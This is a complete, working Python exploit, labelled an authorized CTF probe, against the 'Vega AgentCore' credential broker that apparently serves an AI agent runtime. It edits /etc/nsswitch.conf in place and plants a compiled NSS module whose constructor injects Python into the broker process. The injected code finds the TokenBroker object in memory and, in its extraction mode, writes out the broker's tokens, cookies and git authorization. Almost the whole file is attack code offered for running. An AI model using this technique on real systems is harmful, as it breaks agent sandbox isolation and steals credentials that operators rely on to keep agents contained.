#!/usr/bin/env python3
"""Authorized Vega AgentCore broker-isolation probe.

This probe tests whether a same-UID agent can modify glibc NSS configuration,
cause the credential broker to load an NSS module, and execute code in the
broker. By default, evidence records only whether credential fields exist.
The explicit CTF extraction mode writes selected values locally.
"""

from __future__ import annotations

import argparse
import ctypes
import json
import os
import platform
import re
import shutil
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Any


VERSION = "1.3"
NSSWITCH = Path("/etc/nsswitch.conf")
DEFAULT_WORK_ROOT = Path("/tmp/elt")
STATE_FILENAME = "vega_nss_probe_active.json"
BROKER_NEEDLE = "vega_agentcore.broker"
SECRET_FIELDS = (
    "_token",
    "_ldso_cookie",
    "_git_authorization",
    "_gonfalon_authorization",
)
CTF_FIELDS = ("_token", "_ldso_cookie", "_git_authorization")


class ProbeFailure(RuntimeError):
    pass


def emit(kind: str, message: str) -> None:
    print(f"[{kind}] {message}", flush=True)


def atomic_json(path: Path, value: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_name(path.name + f".tmp.{os.getpid()}")
    temporary.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n")
    os.chmod(temporary, 0o600)
    os.replace(temporary, path)


def read_json(path: Path) -> dict[str, Any]:
    return json.loads(path.read_text())


def state_path(work_root: Path) -> Path:
    return work_root / STATE_FILENAME


def process_cmdline(pid: int) -> str:
    try:
        return Path(f"/proc/{pid}/cmdline").read_bytes().replace(b"\0", b" ").decode(
            "utf-8", "replace"
        ).strip()
    except OSError:
        return ""


def process_status(pid: int) -> dict[str, str]:
    result: dict[str, str] = {}
    try:
        for line in Path(f"/proc/{pid}/status").read_text().splitlines():
            if ":" in line:
                key, value = line.split(":", 1)
                result[key] = value.strip()
    except OSError:
        pass
    return result


def find_brokers() -> list[dict[str, Any]]:
    brokers: list[dict[str, Any]] = []
    for entry in Path("/proc").iterdir():
        if not entry.name.isdigit():
            continue
        pid = int(entry.name)
        cmdline = process_cmdline(pid)
        if BROKER_NEEDLE not in cmdline:
            continue
        status = process_status(pid)
        uid_fields = status.get("Uid", "").split()
        try:
            uid = int(uid_fields[0])
        except (IndexError, ValueError):
            uid = -1
        try:
            mount_ns = os.readlink(f"/proc/{pid}/ns/mnt")
            mount_ns_error = None
        except OSError as exc:
            mount_ns = None
            mount_ns_error = f"{type(exc).__name__}: {exc}"
        brokers.append(
            {
                "pid": pid,
                "uid": uid,
                "mount_ns": mount_ns,
                "mount_ns_error": mount_ns_error,
                "cmdline": cmdline,
                "no_new_privs": status.get("NoNewPrivs"),
                "seccomp": status.get("Seccomp"),
                "cap_eff": status.get("CapEff"),
            }
        )
    return sorted(brokers, key=lambda item: item["pid"])


def glibc_version() -> tuple[str, tuple[int, int] | None]:
    try:
        libc = ctypes.CDLL(None)
        function = libc.gnu_get_libc_version
        function.restype = ctypes.c_char_p
        text = function().decode("ascii", "replace")
    except (AttributeError, OSError):
        family, text = platform.libc_ver()
        if family.lower() != "glibc":
            return f"{family or 'unknown'} {text or 'unknown'}", None
    match = re.match(r"(\d+)\.(\d+)", text)
    parsed = (int(match.group(1)), int(match.group(2))) if match else None
    return f"glibc {text}", parsed


def can_open_for_update(path: Path) -> tuple[bool, str | None]:
    try:
        with path.open("r+b"):
            pass
        return True, None
    except OSError as exc:
        return False, f"{type(exc).__name__}: {exc}"


def find_compiler() -> str | None:
    for name in ("cc", "gcc", "clang"):
        found = shutil.which(name)
        if found:
            return found
    return None


def mapped_libc_directory() -> Path | None:
    try:
        lines = Path("/proc/self/maps").read_text().splitlines()
    except OSError:
        return None
    for line in lines:
        fields = line.split()
        if not fields:
            continue
        candidate = fields[-1]
        if candidate.startswith("/") and re.search(r"/libc(?:-[^/]*)?\.so(?:\.6)?$", candidate):
            return Path(candidate).resolve().parent
    return None


def library_directories(compiler: str | None) -> list[Path]:
    candidates: list[Path] = []

    mapped = mapped_libc_directory()
    if mapped:
        candidates.append(mapped)

    if compiler:
        try:
            output = subprocess.check_output(
                [compiler, "-print-file-name=libc.so.6"],
                text=True,
                stderr=subprocess.DEVNULL,
                timeout=5,
            ).strip()
            if "/" in output:
                candidates.append(Path(output).resolve().parent)
        except (OSError, subprocess.SubprocessError):
            pass

    multiarch = f"{platform.machine()}-linux-gnu"
    machine_aliases = {
        "aarch64": "aarch64-linux-gnu",
        "arm64": "aarch64-linux-gnu",
        "x86_64": "x86_64-linux-gnu",
    }
    multiarch = machine_aliases.get(platform.machine(), multiarch)
    candidates.extend(
        [
            Path("/lib") / multiarch,
            Path("/usr/lib") / multiarch,
            Path("/lib64"),
            Path("/usr/lib64"),
            Path("/lib"),
            Path("/usr/lib"),
            Path("/usr/local/lib"),
        ]
    )

    result: list[Path] = []
    seen: set[str] = set()
    for candidate in candidates:
        try:
            resolved = candidate.resolve()
        except OSError:
            resolved = candidate
        key = str(resolved)
        if key in seen or not resolved.is_dir():
            continue
        seen.add(key)
        result.append(resolved)
    return result


def file_identity(path: Path) -> tuple[int, int] | None:
    try:
        info = path.stat()
        return info.st_dev, info.st_ino
    except OSError:
        return None


def broker_path_visibility(
    brokers: list[dict[str, Any]], directories: list[Path]
) -> list[dict[str, Any]]:
    """Check whether candidate config/module paths resolve to the same objects."""
    local_nss_identity = file_identity(NSSWITCH)
    local_dir_identities = {str(path): file_identity(path) for path in directories}
    results: list[dict[str, Any]] = []

    for broker in brokers:
        pid = broker["pid"]
        root = Path(f"/proc/{pid}/root")
        target_nss = root / str(NSSWITCH).lstrip("/")
        target_nss_identity = file_identity(target_nss)
        if local_nss_identity is None or target_nss_identity is None:
            nss_same: bool | None = None
        else:
            nss_same = local_nss_identity == target_nss_identity

        shared_dirs: list[str] = []
        unknown_dirs: list[str] = []
        for directory in directories:
            local_identity = local_dir_identities[str(directory)]
            target_identity = file_identity(root / str(directory).lstrip("/"))
            if local_identity is None or target_identity is None:
                unknown_dirs.append(str(directory))
            elif local_identity == target_identity:
                shared_dirs.append(str(directory))

        results.append(
            {
                "pid": pid,
                "uid": broker["uid"],
                "nsswitch_same_file": nss_same,
                "shared_loader_directories": shared_dirs,
                "unverified_loader_directories": unknown_dirs,
            }
        )
    return results


def preflight(compiler: str | None) -> dict[str, Any]:
    brokers = find_brokers()
    libc_text, libc_tuple = glibc_version()
    nss_writable, nss_error = can_open_for_update(NSSWITCH)
    try:
        self_mount_ns = os.readlink("/proc/self/ns/mnt")
    except OSError:
        self_mount_ns = "unreadable"

    directories = library_directories(compiler)
    writable_directories = [str(path) for path in directories if os.access(path, os.W_OK)]
    same_uid = bool(brokers) and any(item["uid"] == os.getuid() for item in brokers)
    known_mounts = [item["mount_ns"] for item in brokers if item["mount_ns"]]
    same_mount: bool | None = (
        True
        if self_mount_ns != "unreadable" and self_mount_ns in known_mounts
        else False
        if len(known_mounts) == len(brokers) and brokers
        else None
    )
    broker_visibility = broker_path_visibility(
        [item for item in brokers if item["uid"] == os.getuid()],
        [Path(path) for path in writable_directories],
    )

    report: dict[str, Any] = {
        "version": VERSION,
        "timestamp": time.time(),
        "architecture": platform.machine(),
        "python": platform.python_version(),
        "uid": os.getuid(),
        "mount_ns": self_mount_ns,
        "glibc": libc_text,
        "glibc_auto_reload": bool(libc_tuple and libc_tuple >= (2, 33)),
        "compiler": compiler,
        "nsswitch": str(NSSWITCH),
        "nsswitch_writable_in_place": nss_writable,
        "nsswitch_error": nss_error,
        "library_directories": [str(path) for path in directories],
        "writable_library_directories": writable_directories,
        "brokers": brokers,
        "same_uid_as_broker": same_uid,
        "same_mount_namespace_as_broker": same_mount,
        "broker_path_visibility": broker_visibility,
    }
    return report


def preflight_outcome(report: dict[str, Any]) -> tuple[bool, str]:
    if not report["brokers"]:
        return False, "INCONCLUSIVE_NO_RUNNING_BROKER"
    if not report["same_uid_as_broker"]:
        return False, "NOT_VULNERABLE_TO_THIS_VECTOR_DIFFERENT_UID"
    if not report["glibc_auto_reload"]:
        return False, "NOT_VULNERABLE_TO_LIVE_NSS_RELOAD_ON_THIS_GLIBC"
    if not report["nsswitch_writable_in_place"]:
        return False, "NOT_VULNERABLE_TO_THIS_VECTOR_NSSWITCH_NOT_WRITABLE"
    if not report["writable_library_directories"]:
        return False, "NOT_VULNERABLE_TO_THIS_VECTOR_NO_WRITABLE_LOADER_DIRECTORY"
    if not report["compiler"]:
        return False, "INCONCLUSIVE_NO_NATIVE_COMPILER"
    same_uid_visibility = [
        item
        for item in report["broker_path_visibility"]
        if item["uid"] == report["uid"]
    ]
    if any(
        item["nsswitch_same_file"] is True
        and item["shared_loader_directories"]
        for item in same_uid_visibility
    ):
        return True, "PREFLIGHT_VULNERABLE_CONDITIONS_PRESENT"
    if any(
        item["nsswitch_same_file"] is None
        or (
            item["nsswitch_same_file"] is True
            and item["unverified_loader_directories"]
        )
        for item in same_uid_visibility
    ):
        return False, "INCONCLUSIVE_BROKER_PATH_VISIBILITY_UNVERIFIED"
    if any(item["nsswitch_same_file"] is True for item in same_uid_visibility):
        return False, "NOT_VULNERABLE_TO_THIS_VECTOR_NO_SHARED_LOADER_DIRECTORY"
    return False, "NOT_VULNERABLE_TO_THIS_VECTOR_NSSWITCH_FILE_NOT_SHARED"


def c_literal(value: str) -> str:
    return json.dumps(value)


def python_payload(
    proof_path: Path, error_path: Path, values_path: Path, extract_ctf_values: bool
) -> str:
    fields = repr(SECRET_FIELDS)
    ctf_fields = repr(CTF_FIELDS)
    return f"""import gc,json,os,traceback
try:
    fields={fields}
    obj=next((o for o in gc.get_objects() if type(o).__name__=='TokenBroker' and hasattr(o,'_token') and hasattr(o,'_upstreams')),None)
    result={{'pid':os.getpid(),'token_broker_found':obj is not None,'class_module':type(obj).__module__ if obj is not None else None}}
    if obj is not None:
        result['credential_fields_present']={{k:getattr(obj,k,None) is not None for k in fields}}
        result['upstream_route_names']=sorted(getattr(obj,'_upstreams',{{}}).keys())
        if {extract_ctf_values!r}:
            values={{k:getattr(obj,k,None) for k in {ctf_fields}}}
            if not all(v is None or isinstance(v,str) for v in values.values()):
                raise TypeError('unexpected CTF credential field type')
            path={str(values_path)!r}
            temp=path+'.tmp'
            fd=os.open(temp,os.O_WRONLY|os.O_CREAT|os.O_EXCL,0o600)
            with os.fdopen(fd,'w') as out:
                json.dump({{'pid':os.getpid(),'values':values}},out,sort_keys=True)
                out.write('\\n')
                out.flush()
                os.fsync(out.fileno())
            os.replace(temp,path)
            result['ctf_values_written']=True
    tmp={str(proof_path)!r}+'.tmp'
    open(tmp,'w').write(json.dumps(result,sort_keys=True))
    os.chmod(tmp,0o600)
    os.replace(tmp,{str(proof_path)!r})
except BaseException:
    open({str(error_path)!r},'w').write(traceback.format_exc())
    os.chmod({str(error_path)!r},0o600)
"""


def render_c_source(
    service: str,
    run_dir: Path,
    extract_ctf_values: bool,
) -> str:
    selftest = run_dir / "nss_loader_selftest"
    broker_marker = run_dir / "broker_module_loaded"
    symbols_error = run_dir / "python_symbols_missing"
    thread_error = run_dir / "pthread_create_failed"
    proof = run_dir / "broker_proof.json"
    py_error = run_dir / "python_payload_error.txt"
    pycode = python_payload(proof, py_error, run_dir / "ctf_values.json", extract_ctf_values)
    python_library = f"libpython{sys.version_info.major}.{sys.version_info.minor}.so.1.0"

    return f"""#define _GNU_SOURCE
#include <dlfcn.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
typedef int(*ensure_fn)(void);typedef void(*release_fn)(int);typedef int(*run_fn)(const char*,void*);
static void mark(const char*p){{int f=open(p,O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC,0600);if(f>=0){{dprintf(f,"pid=%ld\\n",(long)getpid());close(f);}}}}
static int broker(void){{char b[4096];int f=open("/proc/self/cmdline",O_RDONLY|O_CLOEXEC),i;ssize_t n;if(f<0)return 0;n=read(f,b,sizeof(b)-1);close(f);if(n<=0)return 0;for(i=0;i<n;i++)if(!b[i])b[i]=' ';b[n]=0;return strstr(b,{c_literal(BROKER_NEEDLE)})!=0;}}
static void*worker(void*x){{(void)x;usleep(250000);void*h=dlopen({c_literal(python_library)},RTLD_NOW|RTLD_NOLOAD);if(!h)h=RTLD_DEFAULT;ensure_fn e=(ensure_fn)dlsym(h,"PyGILState_Ensure");release_fn r=(release_fn)dlsym(h,"PyGILState_Release");run_fn p=(run_fn)dlsym(h,"PyRun_SimpleStringFlags");if(!e||!r||!p){{mark({c_literal(str(symbols_error))});return 0;}}int s=e();p({c_literal(pycode)},0);r(s);return 0;}}
__attribute__((constructor))static void loaded(void){{if(getenv("VEGA_NSS_SELFTEST")){{mark({c_literal(str(selftest))});return;}}if(!broker())return;mark({c_literal(str(broker_marker))});pthread_t t;if(pthread_create(&t,0,worker,0))mark({c_literal(str(thread_error))});else pthread_detach(t);}}
int _nss_{service}_gethostbyname4_r(){{return-1;}}int _nss_{service}_gethostbyname3_r(){{return-1;}}int _nss_{service}_gethostbyname2_r(){{return-1;}}int _nss_{service}_gethostbyname_r(){{return-1;}}
"""


def write_in_place(path: Path, data: bytes) -> None:
    with path.open("r+b", buffering=0) as handle:
        handle.seek(0)
        handle.write(data)
        handle.truncate()
        os.fsync(handle.fileno())


def inject_nss_service(original: bytes, service: str) -> bytes:
    replacement = f"hosts: {service} [UNAVAIL=continue] ".encode()
    changed, count = re.subn(rb"(?m)^hosts:[ \t]*", replacement, original, count=1)
    if count != 1:
        raise ProbeFailure("could not find exactly one hosts: entry in nsswitch.conf")
    return changed


def remove_nss_service(current: bytes, service: str) -> tuple[bytes, bool]:
    prefix = f"hosts: {service} [UNAVAIL=continue] ".encode()
    if prefix not in current:
        return current, False
    return current.replace(prefix, b"hosts: ", 1), True


def compile_module(compiler: str, source: Path, output: Path) -> None:
    command = [
        compiler,
        "-shared",
        "-fPIC",
        "-O2",
        "-pthread",
        str(source),
        "-ldl",
        "-o",
        str(output),
    ]
    completed = subprocess.run(command, text=True, capture_output=True, timeout=60)
    (source.parent / "compiler.stdout.txt").write_text(completed.stdout)
    (source.parent / "compiler.stderr.txt").write_text(completed.stderr)
    if completed.returncode != 0 or not output.is_file():
        raise ProbeFailure(
            f"compiler failed with rc={completed.returncode}; see {source.parent / 'compiler.stderr.txt'}"
        )
    os.chmod(output, 0o755)


def selftest(run_dir: Path) -> tuple[bool, str]:
    marker = run_dir / "nss_loader_selftest"
    environment = os.environ.copy()
    environment["VEGA_NSS_SELFTEST"] = "1"
    command = [
        sys.executable,
        "-c",
        "import socket; socket.getaddrinfo('localhost', 80)",
    ]
    try:
        completed = subprocess.run(
            command,
            env=environment,
            text=True,
            capture_output=True,
            timeout=15,
        )
    except (OSError, subprocess.SubprocessError) as exc:
        return False, f"self-test process failed: {type(exc).__name__}: {exc}"
    detail = f"rc={completed.returncode} stderr={completed.stderr.strip()!r}"
    if marker.exists():
        return True, detail

    debug_environment = environment.copy()
    debug_environment["LD_DEBUG"] = "libs"
    try:
        debug = subprocess.run(
            command,
            env=debug_environment,
            text=True,
            capture_output=True,
            timeout=15,
        )
        (run_dir / "loader_debug.txt").write_text(debug.stderr[-1_000_000:])
    except (OSError, subprocess.SubprocessError) as exc:
        (run_dir / "loader_debug.txt").write_text(repr(exc))
    return False, detail


def raw_http_trigger(route: str, port: int, result: dict[str, str]) -> None:
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=4) as connection:
            connection.settimeout(10)
            request = (
                f"HEAD /{route} HTTP/1.1\r\n"
                "Host: 127.0.0.1\r\n"
                "Connection: close\r\n\r\n"
            ).encode()
            connection.sendall(request)
            response = connection.recv(4096)
            result[route] = response.split(b"\r\n", 1)[0].decode("ascii", "replace")
    except Exception as exc:  # diagnostic path; retain the exact failure
        result[route] = f"{type(exc).__name__}: {exc}"


def trigger_and_wait(
    run_dir: Path,
    port: int,
    idle_seconds: float,
    timeout: float,
) -> dict[str, Any]:
    marker = run_dir / "broker_module_loaded"
    proof_candidates = [run_dir / "broker_proof.json"]
    emit("INFO", f"waiting {idle_seconds:g}s so broker keep-alive connections expire")
    time.sleep(idle_seconds)

    trigger_results: dict[str, str] = {}
    threads = [
        threading.Thread(
            target=raw_http_trigger,
            args=(route, port, trigger_results),
            daemon=True,
        )
        for route in ("bedrock", "inference")
    ]
    for thread in threads:
        thread.start()

    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if marker.exists():
            break
        time.sleep(0.1)

    if marker.exists():
        proof_deadline = time.monotonic() + 5
        while time.monotonic() < proof_deadline:
            if any(path.exists() for path in proof_candidates):
                break
            if any(
                (run_dir / name).exists()
                for name in (
                    "python_symbols_missing",
                    "pthread_create_failed",
                    "python_payload_error.txt",
                )
            ):
                break
            time.sleep(0.1)

    return {
        "broker_marker": marker.exists(),
        "proof_path": next(
            (str(path) for path in proof_candidates if path.exists()), None
        ),
        "trigger_results": trigger_results,
        "python_symbols_missing": (run_dir / "python_symbols_missing").exists(),
        "pthread_create_failed": (run_dir / "pthread_create_failed").exists(),
        "python_payload_error": (run_dir / "python_payload_error.txt").exists(),
    }


def classify(run_dir: Path) -> tuple[str, dict[str, Any] | None]:
    marker = run_dir / "broker_module_loaded"
    proof_path = next(
        (
            path
            for path in (run_dir / "broker_proof.json",)
            if path.exists()
        ),
        None,
    )
    proof: dict[str, Any] | None = None
    if proof_path:
        try:
            proof = read_json(proof_path)
        except (OSError, json.JSONDecodeError):
            proof = None

    if marker.exists() and proof and proof.get("token_broker_found"):
        try:
            values = read_json(run_dir / "ctf_values.json")
            if values.get("pid") == proof.get("pid") and all(
                field in values.get("values", {}) for field in CTF_FIELDS
            ):
                return "VULNERABLE_BROKER_CTF_VALUES_EXTRACTED", proof
        except (OSError, json.JSONDecodeError):
            pass
    if marker.exists() and proof and proof.get("token_broker_found"):
        return "VULNERABLE_BROKER_CODE_EXEC_AND_STATE_ACCESS", proof
    if marker.exists():
        return "VULNERABLE_BROKER_CODE_EXEC", proof
    return "INCONCLUSIVE_NO_FRESH_BROKER_DNS_LOOKUP", proof


def show_ctf_values(run_dir: Path) -> None:
    path = run_dir / "ctf_values.json"
    if not path.exists():
        emit("WARN", f"CTF values file not found; check {run_dir / 'python_payload_error.txt'}")
        return
    data = read_json(path)
    emit("CTF_VALUES_FILE", str(path))
    for field in CTF_FIELDS:
        value = data["values"].get(field)
        if value is not None:
            emit("CTF_VALUE", f"{field}={json.dumps(value, ensure_ascii=True)}")


def save_result(
    state: dict[str, Any],
    outcome: str,
    proof: dict[str, Any] | None,
    extra: dict[str, Any] | None = None,
) -> Path:
    run_dir = Path(state["run_dir"])
    result = {
        "version": VERSION,
        "timestamp": time.time(),
        "outcome": outcome,
        "proof": proof,
        "extra": extra or {},
    }
    path = run_dir / "result.json"
    atomic_json(path, result)
    state["last_outcome"] = outcome
    state["result_path"] = str(path)
    atomic_json(Path(state["state_path"]), state)
    return path


def restore_state(state: dict[str, Any], *, quiet: bool = False) -> list[str]:
    notes: list[str] = []
    restoration_failed = False
    service = state.get("service")
    if service and NSSWITCH.exists():
        try:
            current = NSSWITCH.read_bytes()
            cleaned, removed = remove_nss_service(current, service)
            if removed:
                write_in_place(NSSWITCH, cleaned)
                notes.append("restored nsswitch.conf in place")
            else:
                notes.append("nsswitch service entry already absent")
        except OSError as exc:
            restoration_failed = True
            notes.append(f"could not restore nsswitch.conf: {exc}")

    module_path = state.get("module_path")
    if module_path:
        try:
            Path(module_path).unlink(missing_ok=True)
            notes.append(f"removed {module_path}")
        except OSError as exc:
            restoration_failed = True
            notes.append(f"could not remove module: {exc}")

    state["active"] = restoration_failed
    state["restored_at"] = time.time()
    try:
        atomic_json(Path(state["state_path"]), state)
    except OSError as exc:
        notes.append(f"could not update state file: {exc}")
    if not quiet:
        for note in notes:
            emit("RESTORE", note)
    return notes


def create_probe(args: argparse.Namespace, report: dict[str, Any]) -> dict[str, Any]:
    work_root = Path(args.work_root).resolve()
    work_root.mkdir(parents=True, exist_ok=True)
    if not os.access(work_root, os.W_OK):
        raise ProbeFailure(f"work root is not writable: {work_root}")

    active_path = state_path(work_root)
    if active_path.exists():
        old_state = read_json(active_path)
        if old_state.get("active"):
            raise ProbeFailure(
                f"an active probe already exists; run: {sys.executable} {Path(__file__).resolve()} restore"
            )

    run_id = f"{int(time.time())}-{os.getpid()}"
    run_dir = work_root / f"vega-nss-probe-{run_id}"
    run_dir.mkdir(mode=0o700)
    service = f"vgp{os.getpid():x}{int(time.time()) & 0xFFFF:x}"
    source = run_dir / "libnss_probe.c"
    built_module = run_dir / f"libnss_{service}.so.2"
    source.write_text(render_c_source(service, run_dir, args.extract_ctf_values))

    compiler = report["compiler"]
    if not compiler:
        raise ProbeFailure("no cc, gcc, or clang compiler is available")
    compile_module(compiler, source, built_module)

    original_nss = NSSWITCH.read_bytes()
    (run_dir / "nsswitch.conf.original").write_bytes(original_nss)
    modified_nss = inject_nss_service(original_nss, service)

    state: dict[str, Any] = {
        "version": VERSION,
        "state_path": str(active_path),
        "run_dir": str(run_dir),
        "service": service,
        "module_path": None,
        "active": False,
        "extract_ctf_values": args.extract_ctf_values,
        "created_at": time.time(),
        "preflight_path": str(run_dir / "preflight.json"),
    }
    atomic_json(run_dir / "preflight.json", report)
    atomic_json(active_path, state)

    nss_write_completed = False
    try:
        # Persist the cleanup intent before the in-place write can truncate or
        # partially update nsswitch.conf.
        state["active"] = True
        atomic_json(active_path, state)
        write_in_place(NSSWITCH, modified_nss)
        nss_write_completed = True

        failures: list[str] = []
        for directory_text in report["writable_library_directories"]:
            directory = Path(directory_text)
            destination = directory / built_module.name
            if destination.exists():
                failures.append(f"refused existing path {destination}")
                continue
            try:
                shutil.copyfile(built_module, destination)
                os.chmod(destination, 0o755)
                state["module_path"] = str(destination)
                atomic_json(active_path, state)
                ok, detail = selftest(run_dir)
                if ok:
                    emit("PASS", f"NSS loader accepted {destination}")
                    state["selftest"] = detail
                    atomic_json(active_path, state)
                    return state
                destination.unlink(missing_ok=True)
                state["module_path"] = None
                failures.append(f"{destination}: loader self-test failed ({detail})")
            except OSError as exc:
                try:
                    destination.unlink(missing_ok=True)
                except OSError:
                    pass
                state["module_path"] = None
                failures.append(f"{destination}: {type(exc).__name__}: {exc}")

        (run_dir / "loader_failures.txt").write_text("\n".join(failures) + "\n")
        raise ProbeFailure(
            f"NSS loader self-test failed in every candidate directory; see {run_dir / 'loader_failures.txt'}"
        )
    except BaseException:
        if state.get("active"):
            if not nss_write_completed:
                # A failed in-place write can leave a partial file. The saved
                # bytes are needed because the service prefix may be truncated.
                try:
                    write_in_place(NSSWITCH, original_nss)
                except OSError:
                    pass
            restore_state(state, quiet=True)
        raise


def print_preflight(report: dict[str, Any], outcome: str) -> None:
    emit("INFO", f"architecture={report['architecture']} python={report['python']} {report['glibc']}")
    emit("INFO", f"broker_pids={[item['pid'] for item in report['brokers']]}")
    emit(
        "INFO",
        f"same_uid={report['same_uid_as_broker']} "
        f"same_mount_ns={'unknown' if report['same_mount_namespace_as_broker'] is None else report['same_mount_namespace_as_broker']}",
    )
    for item in report["brokers"]:
        if item["mount_ns_error"]:
            emit("INFO", f"broker_mount_ns pid={item['pid']} {item['mount_ns_error']}")
    for item in report["broker_path_visibility"]:
        emit(
            "INFO",
            f"broker_paths pid={item['pid']} nsswitch_same_file={item['nsswitch_same_file']} "
            f"shared_loader_dirs={item['shared_loader_directories']} "
            f"unverified_loader_dirs={item['unverified_loader_directories']}",
        )
    emit(
        "INFO",
        f"nsswitch_writable={report['nsswitch_writable_in_place']} compiler={report['compiler']}",
    )
    emit("INFO", f"writable_loader_dirs={report['writable_library_directories']}")
    emit("RESULT", outcome)


def action_preflight(args: argparse.Namespace) -> int:
    compiler = find_compiler()
    report = preflight(compiler)
    viable, outcome = preflight_outcome(report)
    print_preflight(report, outcome)
    return 0 if viable else 1


def action_run_or_arm(args: argparse.Namespace) -> int:
    compiler = find_compiler()
    report = preflight(compiler)
    viable, preflight_result = preflight_outcome(report)
    print_preflight(report, preflight_result)
    if not viable:
        if args.attempt_unverified_paths and preflight_result == "INCONCLUSIVE_BROKER_PATH_VISIBILITY_UNVERIFIED":
            emit("WARN", "broker paths could not be inspected; attempting active NSS marker probe")
        else:
            return 1

    state: dict[str, Any] | None = None
    try:
        state = create_probe(args, report)
        run_dir = Path(state["run_dir"])
        emit("PASS", f"probe armed; artifacts={run_dir}")

        if args.action == "arm":
            emit("RESULT", "ARMED_WAITING_FOR_NEXT_BROKER_DNS_LOOKUP")
            emit("NEXT", f"run status with: {sys.executable} {Path(__file__).resolve()} status")
            return 0

        trigger = trigger_and_wait(
            run_dir,
            args.port,
            args.idle_seconds,
            args.timeout,
        )
        outcome, proof = classify(run_dir)
        result_path = save_result(state, outcome, proof, trigger)
        emit("RESULT", outcome)
        emit("EVIDENCE", str(result_path))
        if trigger["proof_path"]:
            emit("PROOF", trigger["proof_path"])
        if args.extract_ctf_values:
            show_ctf_values(run_dir)

        if not args.keep_active:
            restore_state(state)
            if state.get("active"):
                emit("ERROR", "automatic cleanup incomplete; run restore again")
                return 1
        else:
            emit("INFO", "probe remains armed; use status after a normal Vega request")
        return 0
    except (OSError, ProbeFailure, subprocess.SubprocessError) as exc:
        emit("ERROR", f"{type(exc).__name__}: {exc}")
        if state and state.get("active"):
            restore_state(state)
        return 1
    except KeyboardInterrupt:
        emit("INFO", "interrupted")
        if state and state.get("active") and args.action != "arm":
            restore_state(state)
        return 130


def load_active_state(args: argparse.Namespace) -> tuple[Path, dict[str, Any]]:
    path = state_path(Path(args.work_root).resolve())
    if not path.exists():
        raise ProbeFailure(f"state file not found: {path}")
    return path, read_json(path)


def action_status(args: argparse.Namespace) -> int:
    try:
        path, state = load_active_state(args)
        run_dir = Path(state["run_dir"])
        outcome, proof = classify(run_dir)
        emit("RESULT", outcome if state.get("active") else state.get("last_outcome", outcome))
        emit("ARTIFACTS", str(run_dir))
        proof_path = next(
            (
                candidate
                for candidate in (
                    run_dir / "broker_proof.json",
                )
                if candidate.exists()
            ),
            None,
        )
        if proof_path:
            emit("PROOF", str(proof_path))
        if state.get("extract_ctf_values"):
            show_ctf_values(run_dir)
        if state.get("active") and outcome.startswith("VULNERABLE") and not args.keep_active:
            save_result(state, outcome, proof)
            restore_state(state)
        elif state.get("active"):
            module = state.get("module_path")
            if module and not Path(module).exists():
                emit("WARN", "active module disappeared; the container probably reset")
            emit("NEXT", f"restore with: {sys.executable} {Path(__file__).resolve()} restore")
        atomic_json(path, state)
        return 0
    except (OSError, ProbeFailure, json.JSONDecodeError) as exc:
        emit("ERROR", f"{type(exc).__name__}: {exc}")
        return 1


def action_restore(args: argparse.Namespace) -> int:
    try:
        _, state = load_active_state(args)
        restore_state(state)
        outcome = "RESTORE_INCOMPLETE" if state.get("active") else "RESTORED"
        emit("RESULT", outcome)
        return 1 if state.get("active") else 0
    except (OSError, ProbeFailure, json.JSONDecodeError) as exc:
        emit("ERROR", f"{type(exc).__name__}: {exc}")
        return 1


def parser() -> argparse.ArgumentParser:
    result = argparse.ArgumentParser(
        description="Test Vega's same-UID shared-filesystem NSS broker boundary."
    )
    result.add_argument(
        "action",
        nargs="?",
        choices=("run", "arm", "status", "restore", "preflight"),
        default="run",
    )
    result.add_argument(
        "--work-root",
        default=str(DEFAULT_WORK_ROOT),
        help="writable artifact directory (default: /tmp/elt)",
    )
    result.add_argument("--port", type=int, default=8082, help="broker egress port")
    result.add_argument(
        "--idle-seconds",
        type=float,
        default=7.0,
        help="wait before triggering a fresh broker connection",
    )
    result.add_argument(
        "--timeout",
        type=float,
        default=20.0,
        help="seconds to wait for the broker marker",
    )
    result.add_argument(
        "--keep-active",
        action="store_true",
        help="do not restore automatically after an inconclusive or successful run",
    )
    result.add_argument(
        "--attempt-unverified-paths",
        action="store_true",
        help="allow an active probe when broker /proc/root paths cannot be inspected",
    )
    result.add_argument(
        "--extract-ctf-values",
        action="store_true",
        help="write three candidate broker credential values to a local mode-0600 file",
    )
    return result


def main() -> int:
    args = parser().parse_args()
    if args.idle_seconds < 0 or args.timeout <= 0:
        emit("ERROR", "idle-seconds must be >=0 and timeout must be >0")
        return 1
    if args.action == "preflight":
        return action_preflight(args)
    if args.action in ("run", "arm"):
        return action_run_or_arm(args)
    if args.action == "status":
        return action_status(args)
    if args.action == "restore":
        return action_restore(args)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
